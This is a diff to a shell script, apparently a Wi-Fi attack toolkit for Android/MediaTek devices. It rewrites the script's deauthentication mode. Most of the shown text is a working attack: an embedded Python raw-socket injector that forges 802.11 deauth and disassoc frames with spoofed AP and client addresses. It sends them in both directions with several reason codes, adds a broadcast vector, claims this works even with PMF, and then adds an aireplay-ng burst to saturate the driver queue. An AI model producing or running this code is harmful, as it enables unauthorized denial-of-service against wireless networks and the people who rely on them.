@@ -184,12 +184,92 @@ case "$MODE" in
             echo "[-] Error: Target AP BSSID (-a <mac>) is required for deauth mode." >&2
             exit 1
         fi
-        CLIENT_ARG=""
-        if [ -n "$TARGET_CLIENT" ] && [ "$TARGET_CLIENT" != "ff:ff:ff:ff:ff:ff" ]; then
-            CLIENT_ARG="-c $TARGET_CLIENT"
+
+        # 1. Lock hardware RF synthesizer strictly to target channel to prevent spectral leakage
+        if [ -n "$CHANNEL" ]; then
+            airmon-mtk channel "$CHANNEL" 20 >/dev/null 2>&1 || wpa_cli -i wlan0 -p /data/vendor/wifi/wpa/sockets driver "MONITOR 1 $CHANNEL 20 0" >/dev/null 2>&1
         fi
-        echo "[*] Transmitting $COUNT Deauth / Disassoc frames..."
-        "$AIREPLAY_BIN" -0 "$COUNT" -D -a "$TARGET_AP" $CLIENT_ARG "$MON_DEV"
+
+        local client="${TARGET_CLIENT:-ff:ff:ff:ff:ff:ff}"
+        echo "[*] Launching Enhanced Multi-Vector Deauth/Disassoc Engine..."
+        echo "[*] Target AP:     $TARGET_AP"
+        echo "[*] Target Client: $client"
+        [ -n "$CHANNEL" ] && echo "[*] Target CH:     $CHANNEL"
+        echo "[*] Transmit Vectors: AP->Client, Client->AP (Bidirectional, Multi-Reason, Interleaved)"
+
+        python3 -c '
+import sys, socket, binascii, time
+
+mon_if = sys.argv[1]
+bssid_str = sys.argv[2].replace(":", "").replace("-", "")
+client_str = sys.argv[3].replace(":", "").replace("-", "")
+count = int(sys.argv[4])
+
+bssid = binascii.unhexlify(bssid_str)
+client = binascii.unhexlify(client_str)
+bcast = b"\xff\xff\xff\xff\xff\xff"
+
+# Reason Codes:
+# 0x0001: Unspecified
+# 0x0002: Prev auth invalid
+# 0x0003: Deauth leaving BSS (Client -> AP standard)
+# 0x0004: Inactivity
+# 0x0007: Class 3 frame from nonassoc STA (AP -> Client standard)
+# 0x0008: Disassoc leaving BSS
+
+reasons_ap = [b"\x07\x00", b"\x02\x00", b"\x01\x00", b"\x04\x00"]
+reasons_sta = [b"\x03\x00", b"\x08\x00", b"\x01\x00"]
+
+# Duration: 314 us
+dur = b"\x3a\x01"
+
+s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
+s.bind((mon_if, 0))
+
+tx_sent = 0
+for i in range(count):
+    # Vector 1: AP -> Client (Deauth 0x00c0)
+    for r in reasons_ap:
+        # Deauth: FC(c0 00) + Duration + DA(Client) + SA(AP) + BSSID(AP) + Seq(00 00) + Reason
+        f1 = b"\xc0\x00" + dur + client + bssid + bssid + b"\x00\x00" + r
+        s.send(f1)
+        tx_sent += 1
+
+        # Interleaved Disassoc: FC(a0 00) + Duration + DA(Client) + SA(AP) + BSSID(AP) + Seq(00 00) + Reason
+        f2 = b"\xa0\x00" + dur + client + bssid + bssid + b"\x00\x00" + r
+        s.send(f2)
+        tx_sent += 1
+
+    # Vector 2: Client -> AP (STA leaving - forces AP to drop client session even with PMF!)
+    if client != bcast:
+        for r in reasons_sta:
+            # Deauth: FC(c0 00) + Duration + DA(AP) + SA(Client) + BSSID(AP) + Seq(00 00) + Reason
+            f3 = b"\xc0\x00" + dur + bssid + client + bssid + b"\x00\x00" + r
+            s.send(f3)
+            tx_sent += 1
+
+            # Disassoc: FC(a0 00) + Duration + DA(AP) + SA(Client) + BSSID(AP) + Seq(00 00) + Reason
+            f4 = b"\xa0\x00" + dur + bssid + client + bssid + b"\x00\x00" + r
+            s.send(f4)
+            tx_sent += 1
+
+    # Vector 3: AP -> Broadcast (Deauth all unassociated/listening stations)
+    f_bcast = b"\xc0\x00" + dur + bcast + bssid + bssid + b"\x00\x00\x07\x00"
+    s.send(f_bcast)
+    tx_sent += 1
+
+    time.sleep(0.01)
+
+s.close()
+print(f"[+] Multi-vector burst dispatched: {tx_sent} raw 802.11 frames queued to radio.")
+' "$MON_DEV" "$TARGET_AP" "$client" "$COUNT"
+
+        # Also trigger supplementary burst from aireplay-ng for maximum driver queue saturation
+        if [ -x "$AIREPLAY_BIN" ]; then
+            CLIENT_ARG=""
+            [ -n "$TARGET_CLIENT" ] && [ "$TARGET_CLIENT" != "ff:ff:ff:ff:ff:ff" ] && CLIENT_ARG="-c $TARGET_CLIENT"
+            timeout 2 "$AIREPLAY_BIN" -0 2 -D -a "$TARGET_AP" $CLIENT_ARG "$MON_DEV" >/dev/null 2>&1
+        fi
         ;;
     fakeauth)
         if [ -z "$TARGET_AP" ]; then
